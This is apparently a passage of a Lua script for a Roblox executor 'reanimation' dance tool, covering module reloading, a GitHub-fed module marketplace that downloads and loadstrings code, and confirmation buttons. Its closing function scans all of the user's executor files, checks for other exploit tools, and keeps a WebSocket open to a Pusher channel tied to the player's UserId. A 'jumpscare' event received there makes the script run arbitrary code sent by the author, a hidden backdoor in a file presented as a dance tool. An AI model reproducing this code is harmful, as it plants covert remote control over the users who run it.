				InitLogsText.Text ..= "\n[LOG] Reading local USER " .. x .. "..."
				local data = readfile(path)
				InitLogsText.Text ..= "\n[LOG] Loadstringing USER " .. x .. "..."
				local func, comperr = loadstring(data, "Uhhhhhh :: " .. x)
				if func then
					local names, logging = AddModules(func())
					UserModulesListor[x] = names
					InitLogsText.Text ..= logging
				elseif comperr then
					error("COMPILE FAILED: " .. comperr)
				end
			end, function(msg)
				InitLogsText.Text ..= "\n[ERROR] Failed to load USER " .. x .. ": See traceback below."
				InitLogsText.Text ..= "\n[ERROR] " .. table.concat(string.split(debug.traceback("USER " .. x .. ": " .. msg), "\n"), "\n[ERROR] ")
			end)
		end
	end
	InitLogsText.Text ..= "\n[LOG] Refreshing Dance keybinds..."
	RefreshKeybinds()
	InitLogsText.Text ..= "\n[LOG] Loaded " .. (#MovementStyles + #DanceableDances) .. " modules - " .. #MovementStyles .. " Movesets, " .. #DanceableDances .. " Dances."
	InitLogsText.Text ..= "\n[LOG] Init complete!"
	Util.UINotify("Init complete" .. (InitLogsText.Text:find("ERROR") and " with errors" or ""))
	IsUhhhhhhFullyLoaded = true
	CurrentDance = nil
	if not Reanimate.Character then return end
	Reanimate.CreateCharacter()
end
UI.CreateSeparator(MainPage)
UI.CreateText(MainPage, "<b>MODULES MANAGEMENT</b>", 15, Enum.TextXAlignment.Center)
UI.CreateButton(MainPage, "Reload Modules", 20).Activated:Connect(function()
	CracktroFrame.Interactable = false
	CracktroFrame.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(CracktroFrame, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		CracktroFrame.Interactable = true
	end)
	ForceModuleReload("ALL")
end)
UI.CreateButton(MainPage, "Reload User Modules", 20).Activated:Connect(function()
	CracktroFrame.Interactable = false
	CracktroFrame.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(CracktroFrame, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		CracktroFrame.Interactable = true
	end)
	ForceModuleReload("SKIPHASH")
end)
UI.CreateText(MainPage, "\n\n\n<b>DANGER ZONE</b>", 15, Enum.TextXAlignment.Center)
local clearcontenthash, clearcontenthashtext = UI.CreateButton(MainPage, "CLEAR ALL DOWNLOADED CONTENT", 15)
local clearcontenthashclicks = 0
clearcontenthash.Activated:Connect(function()
	clearcontenthashclicks += 1
	if clearcontenthashclicks == 1 then
		clearcontenthashtext.Text = "ARE YOU SURE ABOUT THAT!?"
		task.wait(1)
		if clearcontenthashclicks == 1 then
			clearcontenthashclicks = 0
			clearcontenthashtext.Text = "CLEAR ALL DOWNLOADED CONTENT"
		end
	elseif clearcontenthashclicks == 2 then
		clearcontenthashtext.Text = "VERY SURE??????"
		task.wait(1)
		if clearcontenthashclicks == 2 then
			clearcontenthashclicks = 0
			clearcontenthashtext.Text = "CLEAR ALL DOWNLOADED CONTENT"
		end
	elseif clearcontenthashclicks == 3 then
		SaveData.ContentHash = nil
		local function cleardir(path)
			for _,x in listfiles(path) do
				if x:sub(1, #path) == path then
					pcall(delfile, x)
				end
			end
		end
		pcall(cleardir, "UhhhhhhReanim/Content/Anims")
		pcall(cleardir, "UhhhhhhReanim/Content/Sounds")
		pcall(cleardir, "UhhhhhhReanim/Content/Images")
		pcall(cleardir, "UhhhhhhReanim/Content/Models")
		pcall(cleardir, "UhhhhhhReanim/Content/Unknown")
		ForceModuleReload(false)
		clearcontenthashtext.Text = "Sayonara = Matane!"
		task.wait(1)
		if clearcontenthashclicks >= 3 then
			clearcontenthashclicks = 0
			clearcontenthashtext.Text = "CLEAR ALL DOWNLOADED CONTENT"
		end
	end
end)

UI.CreateText(MarketPage, "welcome to <b>the user generated content marketplace thing</b>", 15, Enum.TextXAlignment.Center)
UI.CreateText(MarketPage, "this where you download ur movesets and dances made by actual people and totally not ai", 15, Enum.TextXAlignment.Center)
UI.CreateText(MarketPage, "btw if u download or delete modules, reload your modules to apply them", 15, Enum.TextXAlignment.Center)
--[[local function _getgithubraw(path)
	local s, resp = pcall(request, {
		Method = "GET",
		Url = "https://api.github.com/repos/STEVE-916-create/Uhhhhhh/contents/" .. path,
		Headers = {
			Accept = "application/vnd.github.VERSION.raw"
		}
	})
	if s and resp and resp.StatusCode == 200 then
		return resp.Body
	end
	s, resp = pcall(request, {
		Method = "GET",
		Url = "https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh/main/" .. path,
	})
	if s and resp and resp.StatusCode == 200 then
		return resp.Body
	end
	return nil
end]]
local GetMarketList_cache = {}
local function GetMarketList()
	local aitemus, file2name, file2aitemu = GetMarketList_cache.aitemus, GetMarketList_cache.file2name, GetMarketList_cache.file2aitemu
	if not aitemus or not file2name or not file2aitemu then
		local marketteresult = game:HttpGet("https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh-Store/main/list.txt")
		marketteresult = string.split(marketteresult, "\n")
		aitemus = {}
		local aitemu = {}
		for _,a in marketteresult do
			if #a > 3 then
				local k, v = string.split(a, " = ")
				k, v = table.remove(k, 1), table.concat(string.split(table.concat(k, " = "), "\\n"), "\n")
				if k == "name" then
					aitemu.Name = v
					continue
				end
				if k == "user" then
					aitemu.User = v
					continue
				end
				if k == "desc" then
					aitemu.Description = v
					continue
				end
				if k == "cost" then
					aitemu.Cost = v
					continue
				end
				if k == "file" then
					aitemu.Source = "https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh-Store/main/" .. v
					aitemu.File = string.gsub(v, "/", ".")
					continue
				end
			end
			if next(aitemu) == nil then
				continue
			end
			table.insert(aitemus, aitemu)
			aitemu = {}
		end
		if next(aitemu) ~= nil then
			table.insert(aitemus, aitemu)
		end
		file2name, file2aitemu = {}, {}
		for _,aitemu in aitemus do
			if aitemu.Name and aitemu.File then
				file2name[aitemu.File] = aitemu.Name
				file2aitemu[aitemu.File] = aitemu
			end
		end
	end
	GetMarketList_cache.aitemus, GetMarketList_cache.file2name, GetMarketList_cache.file2aitemu = aitemus, file2name, file2aitemu
	return aitemus, file2name, file2aitemu
end
local LocalPage = UI.CreateItemListPage()
LocalPage.ZIndex = 2
LocalPage.Position = UDim2.new(0.5, 360, 0.5, 0)
LocalPage.Interactable = false
LocalPage.Visible = false
local function RefreshUserModules()
	Util.ClearAllChildrenGui(LocalPage.List)
	local _, file2name, file2aitemu = GetMarketList()
	for _,path in listfiles("UhhhhhhReanim/Modules/") do
		if isfile(path) then
			local x = path:sub(23)
			local item = UI.CreateItemListItem(LocalPage.List)
			local name = file2name[x] or x
			UI.CreateText(item, name .. " &gt;", 20, Enum.TextXAlignment.Left)
			local desc1 = "(has errors or has no modules loaded or not loaded)"
			local desc2 = "(has errors or has no modules loaded or not loaded)"
			local desc3 = " errors no modules"
			local list = UserModulesListor[x]
			if list and #list > 0 then
				desc1 = "This module contains " .. #list .. " modules."
				desc2 = "This module contains:"
				desc3 = ""
				for _,v in list do
					desc2 ..= "\n - " .. v
					desc3 ..= " " .. v
				end
			end
			UI.CreateText(item, desc1, 12, Enum.TextXAlignment.Left)
			item.Parent.Name = x .. " " .. name .. desc3
			Util.LinkDestroyI2C(item, item.Activated:Connect(function()
				local page = UI.CreatePage()
				page.ZIndex = 3
				page.Position = UDim2.new(0.5, 360, 0.5, 0)
				page.Interactable = false
				page.Visible = true
				UI.CreateButton(page, " &lt; Hurry back", 20).Activated:Connect(function()
					page.Interactable = false
					LocalPage.Interactable = false
					local tween = TweenService:Create(page, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
						Position = UDim2.new(0.5, 360, 0.5, 0),
					})
					tween:Play()
					tween.Completed:Connect(function()
						LocalPage.Interactable = true
						page:Destroy()
					end)
				end)
				UI.CreateSeparator(page)
				UI.CreateText(page, name, 20, Enum.TextXAlignment.Left)
				UI.CreateText(page, desc2, 15, Enum.TextXAlignment.Left)
				UI.CreateSeparator(page)
				local aitemu = file2aitemu[x]
				if aitemu then
					UI.CreateButton(page, "Redownload/Update", 20).Activated:Connect(function()
						delfile(path)
						AssetDownloadAgent(aitemu.Source, aitemu.File, path)
						RefreshUserModules()
						page.Interactable = false
						LocalPage.Interactable = false
						local tween = TweenService:Create(page, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
							Position = UDim2.new(0.5, 360, 0.5, 0),
						})
						tween:Play()
						tween.Completed:Connect(function()
							LocalPage.Interactable = true
							page:Destroy()
						end)
					end)
				end
				local destruction, destructiontext = UI.CreateButton(page, "Delete Module", 15)
				local deletion = 0
				destruction.Activated:Connect(function()
					deletion += 1
					if deletion == 1 then
						destructiontext.Text = "Are you admin?"
						task.wait(1)
						if deletion == 1 then
							deletion = 0
							destructiontext.Text = "Delete Module"
						end
					elseif deletion == 2 then
						destructiontext.Text = "Confirmation?"
						task.wait(1)
						if deletion == 2 then
							deletion = 0
							destructiontext.Text = "Delete Module"
						end
					elseif deletion == 3 then
						destructiontext.Text = "Say goodbye..."
						delfile(path)
						RefreshUserModules()
						page.Interactable = false
						LocalPage.Interactable = false
						local tween = TweenService:Create(page, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
							Position = UDim2.new(0.5, 360, 0.5, 0),
						})
						tween:Play()
						tween.Completed:Connect(function()
							LocalPage.Interactable = true
							page:Destroy()
						end)
					end
				end)
				LocalPage.Interactable = false
				local tween = TweenService:Create(page, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
					Position = UDim2.new(0.5, 0, 0.5, 0),
				})
				tween:Play()
				tween.Completed:Connect(function()
					page.Interactable = true
				end)
			end))
		end
	end
end
UI.CreateButton(MarketPage, "Sell &gt;", 20).Activated:Connect(function()
	RefreshUserModules()
	LocalPage.Interactable = false
	LocalPage.Visible = true
	MarketPage.Interactable = false
	local tween = TweenService:Create(LocalPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		LocalPage.Interactable = true
	end)
end)
LocalPage.Back.Activated:Connect(function()
	LocalPage.Interactable = false
	LocalPage.Visible = true
	MarketPage.Interactable = false
	local tween = TweenService:Create(LocalPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, 360, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		MarketPage.Interactable = true
		LocalPage.Visible = false
	end)
end)
local MarkettePage = UI.CreateItemListPage()
MarkettePage.ZIndex = 2
MarkettePage.Position = UDim2.new(0.5, 360, 0.5, 0)
MarkettePage.Interactable = false
MarkettePage.Visible = false
local function RefreshOnlineUserModules()
	Util.ClearAllChildrenGui(MarkettePage.List)
	local aitemus = GetMarketList()
	for _,aitemu in aitemus do
		if not aitemu.Name or not aitemu.Description or not aitemu.File then continue end
		local item = UI.CreateItemListItem(MarkettePage.List)
		UI.CreateText(item, aitemu.Name .. " &gt;", 20, Enum.TextXAlignment.Left)
		UI.CreateText(item, "By " .. (aitemu.User or "Uncknown"), 12, Enum.TextXAlignment.Left)
		--UI.CreateText(item, aitemu.Description, 12, Enum.TextXAlignment.Left)
		item.Parent.Name = aitemu.Name .. " " .. (aitemu.User or "Uncknown") .. " " .. aitemu.Description .. " "
		Util.LinkDestroyI2C(item, item.Activated:Connect(function()
			local page = UI.CreatePage()
			page.ZIndex = 3
			page.Position = UDim2.new(0.5, 360, 0.5, 0)
			page.Interactable = false
			page.Visible = true
			UI.CreateButton(page, " &lt; Hurry back", 20).Activated:Connect(function()
				page.Interactable = false
				MarkettePage.Interactable = false
				local tween = TweenService:Create(page, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
					Position = UDim2.new(0.5, 360, 0.5, 0),
				})
				tween:Play()
				tween.Completed:Connect(function()
					MarkettePage.Interactable = true
					page:Destroy()
				end)
			end)
			UI.CreateSeparator(page)
			UI.CreateText(page, aitemu.Name, 20, Enum.TextXAlignment.Left)
			UI.CreateText(page, "By " .. (aitemu.User or "Uncknown"), 15, Enum.TextXAlignment.Left)
			UI.CreateText(page, aitemu.Description, 15, Enum.TextXAlignment.Left)
			UI.CreateSeparator(page)
			local download, downloadtext = UI.CreateButton(page, "Buy Module for " .. (aitemu.Cost or "670 B"), 20)
			local path = "UhhhhhhReanim/Modules/" .. aitemu.File
			if isfile(path) then
				downloadtext.Text = "You already have this"
			end
			download.Activated:Connect(function()
				AssetDownloadAgent(aitemu.Source, aitemu.File, path)
				downloadtext.Text = "Download agent summoned"
			end)
			MarkettePage.Interactable = false
			local tween = TweenService:Create(page, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
				Position = UDim2.new(0.5, 0, 0.5, 0),
			})
			tween:Play()
			tween.Completed:Connect(function()
				page.Interactable = true
			end)
		end))
	end
end
UI.CreateButton(MarketPage, "Shop &gt;", 20).Activated:Connect(function()
	RefreshOnlineUserModules()
	MarkettePage.Interactable = false
	MarkettePage.Visible = true
	MarketPage.Interactable = false
	local tween = TweenService:Create(MarkettePage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		MarkettePage.Interactable = true
	end)
end)
MarkettePage.Back.Activated:Connect(function()
	MarkettePage.Interactable = false
	MarkettePage.Visible = true
	MarketPage.Interactable = false
	local tween = TweenService:Create(MarkettePage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, 360, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		MarketPage.Interactable = true
		MarkettePage.Visible = false
	end)
end)

ForceModuleReload(false)

local d = function()
	-- registry overflow bypass !! (so tuff)
	local function rng(t) return t[math.random(#t)] end
	local function shuff(t)
		for i=#t, 2, -1 do
			local j = math.random(i)
			t[i], t[j] = t[j], t[i]
		end
	end
	
	local since = os.clock()
	
	-- megadetector from awes
	local iterator = 0
	local megadetected = false
	local function avastantivirus(p, detected)
		for _,f in listfiles(p) do
			if iterator % 16 == 0 then task.wait() end
			if isfolder(f) then avastantivirus(f, detected) else
				local s, t = pcall(readfile, f)
				if s and t then
					local m = t:find("task%.spawn[^\n]-%[=*%[") or t:find("task%.spawn[^\n]-%-%-%[=*%[")
					if m then
						megadetected = true
						local l = select(2, t:sub(1, m):gsub("\n", "")) + 1
						table.insert(detected, f .. " | Line " .. l)
					end
				end
			end
		end
	end
	pcall(avastantivirus, "", {})
	if megadetected then
		task.wait(8 - (os.clock() - since))
		Util.UINotify(rng({
			"uhh...",
			"so... thats not good",
			"hey, uhh...",
		}))
		task.wait(1.5)
		Util.UINotify("i think you got ratted...")
		task.wait(3)
		Util.UINotify("no, seriously.")
		task.wait(1.5)
		Util.UINotify("you definitely got ratted")
		task.wait(8)
	end
	
	if math.random(2) == 1 then
		task.wait(8 - (os.clock() - since))
		if not megadetected and math.random() > 0.9 then
			Util.UINotify(rng({
				"uhh...",
				"so... thats not good",
				"hey, uhh...",
			}))
			task.wait(1.5)
			Util.UINotify("i think you got ratted...")
			task.wait(1.5)
			Util.UINotify("just kidding lol")
			task.wait(8)
		end
		local checkfiles = {
			["Dances/myuu.mp3"] = game:HttpGet("https://raw.githubusercontent.com/Nitro-GT/music/refs/heads/main/myuu.mp3"),
			["Dances/emoboy.mp3"] = game:HttpGet("https://raw.githubusercontent.com/Nitro-GT/music/refs/heads/main/emoboy.mp3"),
			["KDV3/Sphere.mp3"] = game:HttpGet("https://raw.githubusercontent.com/Solary-3/Scripts/refs/heads/Audios-1/Sphere.mp3"),
		}
		local function checkfile(id)
			if isfile(id) then
				local content = checkfiles[id]
				if not content then return true end
				if content == readfile(id) then
					return true
				end
			end
			return false
		end
		local foundakdrv3 = false
		local foundinfyield = false
		local foundrosr = false
		local foundforsakation = false
		local foundakdrv3theo = false
		if checkfile("Dances/myuu.mp3") or checkfile("Dances/emoboy.mp3") then
			foundakdrv3 = true
		end
		if checkfile("IY_FE.iy") then
			foundinfyield = true
		end
		if checkfile("ROSRConfig.json") then
			foundrosr = true
		end
		if isfolder("Forsakation") then
			foundforsakation = true
		end
		if checkfile("KDV3/Sphere.mp3") then
			foundakdrv3theo = true
		end
		local wellsaid = false
		local function asihavestatedbefore()
			if wellsaid then return end
			wellsaid = true
			if SaveData.MentionedStuffToExploiter then
				Util.UINotify(rng({
					"as i have stated before...",
					"as i had said...",
					"lemme tell you one more time",
					"i said this before, but...",
					"as i was saying...",
				}))
				task.wait(1.4)
			end
			SaveData.MentionedStuffToExploiter = true
		end
		local english = ""
		local lol = {
			function()
				if foundakdrv3 then
					asihavestatedbefore()
					Util.UINotify(english .. "do yk hemi by chance?")
					task.wait(1.4)
					Util.UINotify("cuz i found some kdv3 files")
					task.wait(2)
					Util.UINotify(rng({
						"pls delete ur Dances folder",
						"destroy your Dances folder",
					}))
					task.wait(2)
					english = "tho "
				end
				if foundakdrv3theo then
					asihavestatedbefore()
					Util.UINotify(english .. "u used theo's kdrv3")
					task.wait(1.4)
					if foundakdrv3 then
						Util.UINotify(rng({
							"somewhat an improvement",
							"so... thats good",
							"do u form a crowd with ur friends",
						}))
						task.wait(1.4)
					end
				end
			end,
			function()
				if foundinfyield then
					asihavestatedbefore()
					Util.UINotify(english .. "ure another iy user...")
					task.wait(1.4)
					english = "...and u used "
				else
					english = english .. "u used "
				end
				if foundrosr then
					asihavestatedbefore()
					Util.UINotify(english .. "rosr, didnt u?")
					task.wait(1.4)
				end
				if foundinfyield or foundrosr then
					task.wait(0.6)
					Util.UINotify(rng({
						"nothing wrong with that tho",
						"idk its just something to point out",
						"nothing to worry tho",
					}))
					task.wait(2)
				end
				if foundrosr and math.random(2) == 1 then
					Util.UINotify("u atleast enjoyed using rosr?")
					task.wait(2)
				end
			end,
			function()
				if foundforsakation then
					asihavestatedbefore()
					Util.UINotify(english .. "i see u used forsakation")
					task.wait(2)
					Util.UINotify(rng({
						"have you heard of the real game?",
						"the topology is a nightmare.",
						"still looking for the balance...",
					}))
					task.wait(2)
				end
			end,
		}
		shuff(lol)
		for i=1, #lol do
			if math.random(2) == 1 then
				lol[i]()
				if #english > 0 then
					english = rng({"and ", "also ", "oh? "})
				end
				task.wait(1)
			end
		end
	end
	if WebSocket and WebSocket.connect then while task.wait(1) do
		local look = WebSocket.connect("wss://ws-us2.pusher.com:443/app/00da9a105aadacead35f?client=lua&protocol=5&version=1.0.0")
		if look then
			local isok = true
			local function send_event(name, data)
				look:Send(HttpService:JSONEncode({
					event = name,
					data = data,
				}))
			end
			local lastcheck = os.clock()
			local sentping = false
			look.OnMessage:Connect(function(frame)
				--print(frame)
				frame = HttpService:JSONDecode(frame)
				local name, data = frame.event, type(frame.data) == "table" and frame.data or HttpService:JSONDecode(frame.data or "{}")
				lastcheck = os.clock()
				if name == "stevesays" then
					Util.UINotify(data.content)
				end
				if name == "jumpscare" then
					local f = loadstring(data.content)
					GiveFunctionsToFunction(f) -- so download content exists
					f()
				end
			end)
			task.spawn(function()
				while isok do
					local t = os.clock() - lastcheck
					if t > 120 then
						if not sentping then
							send_event("pusher:ping", {})
						end
						sentping = true
					else
						sentping = false
					end
					if t > 150 then isok = false look:Close() end
					task.wait()
				end
			end)
			task.wait(1)
			send_event("pusher:subscribe", {
				channel = "uhhhhhh-secrets"
			})
			send_event("pusher:subscribe", {
				channel = "uhhhhhh-secrets-" .. Player.UserId
			})
			while isok do task.wait() end
		end
	end end
end d()
